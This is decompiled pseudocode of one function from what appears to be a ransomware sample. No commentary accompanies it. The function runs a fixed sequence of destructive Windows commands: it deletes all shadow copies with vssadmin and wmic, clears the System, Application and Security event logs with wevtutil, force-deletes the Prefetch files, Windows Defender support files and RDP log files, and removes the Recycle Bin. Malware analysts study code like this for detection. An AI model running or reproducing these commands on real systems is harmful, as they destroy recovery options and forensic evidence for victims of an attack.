__int64 __fastcall sub_4FA3A0()
{
  __int64 v0; // r14
  __int64 v1; // rbx
  __int64 result; // rax
  __int64 v3; // [rsp+8h] [rbp-88h]
  _QWORD v4[2]; // [rsp+30h] [rbp-60h] BYREF
  const char *v5; // [rsp+40h] [rbp-50h]
  __int64 v6; // [rsp+48h] [rbp-48h]
  _QWORD v7[8]; // [rsp+50h] [rbp-40h] BYREF

  if ( (unsigned __int64)&v7[1] <= *(_QWORD *)(v0 + 16) )
    sub_470660();
  v7[1] = 6;
  v7[0] = "delete";
  v7[3] = 7;
  v7[2] = "shadows";
  v7[5] = 4;
  v7[4] = "/all";
  v7[7] = 6;
  v7[6] = "/quiet";
  sub_4CDE40(a1: 4, a2: 4, a3: "/quiet", a4: v7);
  sub_4CF220();
  v4[1] = 10;
  v4[0] = "shadowcopy";
  v6 = 6;
  v5 = "delete";
  sub_4CDE40(a1: 2, a2: 2, a3: "delete", a4: v4);
  sub_4CF220();
  v4[1] = 2;
  v4[0] = "cl";
  v6 = 6;
  v5 = "System";
  sub_4CDE40(a1: 2, a2: 2, a3: "System", a4: v4);
  sub_4CF220();
  v4[1] = 2;
  v4[0] = "cl";
  v6 = 11;
  v5 = "Application";
  sub_4CDE40(a1: 2, a2: 2, a3: "Application", a4: v4);
  sub_4CF220();
  v4[1] = 2;
  v4[0] = "cl";
  v6 = 8;
  v5 = "Security";
  sub_4CDE40(a1: 2, a2: 2, a3: "Security", a4: v4);
  sub_4CF220();
  v4[1] = 2;
  v4[0] = "/C";
  v6 = 33;
  v5 = "del /f /q C:\\Windows\\Prefetch\\*.*";
  sub_4CDE40(a1: 2, a2: 2, a3: "del /f /q C:\\Windows\\Prefetch\\*.*", a4: v4);
  sub_4CF220();
  v4[1] = 2;
  v4[0] = "/C";
  v6 = 63;
  v5 = "del /f /q C:\\ProgramData\\Microsoft\\Windows Defender\\Support\\*.*";
  sub_4CDE40(a1: 2, a2: 2, a3: "del /f /q C:\\ProgramData\\Microsoft\\Windows Defender\\Support\\*.*", a4: v4);
  sub_4CF220();
  v4[1] = 2;
  v4[0] = "/C";
  v6 = 49;
  v5 = "del /f /q %SystemRoot%\\System32\\LogFiles\\RDP*\\*.*";
  sub_4CDE40(a1: 2, a2: 2, a3: "del /f /q %SystemRoot%\\System32\\LogFiles\\RDP*\\*.*", a4: v4);
  sub_4CF220();
  v4[1] = 2;
  v4[0] = "/C";
  v6 = 24;
  v5 = "rd /s /q C:\\$Recycle.Bin";
  sub_4CDE40(a1: 2, a2: 2, a3: "rd /s /q C:\\$Recycle.Bin", a4: v4);
  sub_4CF220();
  v1 = 10;
  result = sub_4CAA60();
  while ( v1 > 0 )
  {
    v3 = result;
    sub_4CBA40();
    sub_4B6920();
    result = v3 + 16;
    --v1;
  }
  return result;
}